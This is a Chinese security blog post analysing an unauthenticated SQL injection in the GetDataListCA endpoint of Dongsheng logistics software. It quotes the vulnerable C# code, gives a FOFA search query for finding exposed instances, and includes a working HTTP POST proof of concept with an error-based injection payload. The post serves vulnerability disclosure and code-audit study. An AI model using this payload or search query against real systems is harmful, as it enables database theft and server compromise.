---
title: "东胜物流软件 GetDataListCA SQL注入漏洞"
source: https://mrxn.net/jswz/dongsheng-MsCwGenlegAccitems-GetDataListCA-sqli.html
asset_dir: assets/东胜物流软件-getdatalistca-sql注入漏洞
---

# 东胜物流软件 GetDataListCA SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/17 12:33
- 971浏览
- [0评论](#comment)
- 38分钟阅读

深入探索

SQL

鉴权

木马

---

# 漏洞简介

东胜物流[软件](#)是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 GetDataListCA 接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

物流软件安全

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

> 系统基于ASP.NET MVC 架构，因此和常规的稍微不同

看下MsCwGenlegAccitemsController里GetDataListCA的实现部分

```
#region 期初列表操作
public ContentResult GetDataListCA(string PACCGID, string condition)
{
    if (PACCGID.Trim().IndexOf("root") > -1)
    {
        PACCGID = "ZC','FZ','GT','QY','CB','SY";
    }
    if (!string.IsNullOrEmpty(PACCGID))
    {
        condition += " and PACCGID in ('" + PACCGID + "')";
    }
    var dataList = MsCwGenlegAccitemsDAL.GetDataListCA(condition, Convert.ToString(Session["USERID"]));
    var json = JsonConvert.Serialize(new { Success = true, Message = "查询成功", totalCount = dataList.Count, data = dataList.ToList() });
    return new ContentResult() { Content = json };
}
```

深入探索

漏洞扫描服务

恶意软件分析工具

代码安全审计

如果PACCGID不为空则直接将其拼接进condition语句中，然后带入MsCwGenlegAccitemsDAL.GetDataListCA中，其实现如下

SQL注入检测工具

```
#region 查询期初列表
static public List<MsCwAccitemsGl> GetDataListCA(string strCondition, string strUserID)
{
    string strCwSTARTGID = BasicDataRefDAL.GetCwSTARTGID(strUserID);
    string strCwACCDATE = BasicDataRefDAL.GetCwACCDATE(strUserID);
    var strSql = new StringBuilder();
    strSql.Append("SELECT GID,ACCID,ACCNAME,DETAILED,DC,ISFCY,ISDEPTACC,ISEMPLACC,ISCORPACC,ISITEMACC,REMARKS,[YEAR],[MONTH],PACCGID=(case when (PACCGID='ZC' or PACCGID='FZ' or PACCGID='GT' or PACCGID='QY' or PACCGID='CB' or PACCGID='SY') then '0' else PACCGID end),ACCATTRIBUTE,ACCTYPE,PACCID=(select top 1 ACCID from [cw_accitems_gl] as a where a.gid=cw_accitems_gl.PACCGID),PACCNAME=(select top 1 ACCNAME from [cw_accitems_gl] as b where b.gid=cw_accitems_gl.PACCGID),gid as [id],ACCID+' '+ACCNAME as [NAME],DR=isnull((select isnull(sum(QTYYEARDR),0) as QTYYEARDR from [cw_genleg_accitems] as c where c.[STARTGID]='" + strCwSTARTGID + "' and c.LINKGID=cw_accitems_gl.GID and IsInitialEntry=1),0),CR=isnull((select isnull(sum(QTYYEARCR),0) as QTYYEARCR from [cw_genleg_accitems] as d where d.[STARTGID]='" + strCwSTARTGID + "' and d.LINKGID=cw_accitems_gl.GID and IsInitialEntry=1),0),ISENABLE=isnull((select top 1 isnull(ISENABLE,0) as ISENABLE from [cw_genleg_accitems] as e where e.[STARTGID]='" + strCwSTARTGID + "' and e.ACCDATE=(select top 1 STARTMONTH from cw_design_startusing where [GID]='" + strCwSTARTGID + "') and e.LINKGID=cw_accitems_gl.GID),0),PFADR=isnull((select isnull(sum(PFADR),0) as PFADR from [cw_genleg_accitems] as c where c.[STARTGID]='" + strCwSTARTGID + "' and c.LINKGID=cw_accitems_gl.GID and IsInitialEntry=1),0),PFACR=isnull((select isnull(sum(PFACR),0) as PFACR from [cw_genleg_accitems] as d where d.[STARTGID]='" + strCwSTARTGID + "' and d.LINKGID=cw_accitems_gl.GID and IsInitialEntry=1),0),STARTMONTH=isnull((select top 1 STARTMONTH from [cw_design_startusing] where (ISDELETE=0 or ISDELETE is null) and gid=(select top 1 GID from [cw_genleg_accitems] as d where d.[STARTGID]='" + strCwSTARTGID + "' and d.LINKGID=cw_accitems_gl.GID and IsInitialEntry=1)),0)");
    strSql.Append(" from [cw_accitems_gl] where [YEAR]=SUBSTRING('" + strCwACCDATE + "',1,4) and [STARTGID]='" + strCwSTARTGID + "'");
    //
    if (!string.IsNullOrEmpty(strCondition))
    {
        strSql.Append(strCondition);
    }
    strSql.Append(" order by [YEAR],ACCID");
    return SetDataCA(strSql);
}
```

strCondition也是直接拼接在strSql语句里，然后用SetDataCA进行执行

漏洞修复方案

[![东胜物流软件 GetDataListCA SQL注入漏洞](images/img-001-a09aeaac9a0f.webp)](https://image.mrxn.net/fb14aee36a694af488f0f5f4d270be52.webp)

全程无过滤或校验，导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /MvcShipping/MsCwGenlegAccitems/GetDataListCA HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/x-www-form-urlencoded

PACCGID=-1')and 1<@@VERSION--
```

[![东胜物流软件 GetDataListCA SQL注入漏洞](images/img-002-2ee80b93c029.webp)](https://image.mrxn.net/7ca5fcfd9bc14d368b189646075a5529.webp)

通过报错注入在响应里回显数据库版本信息。

网络安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
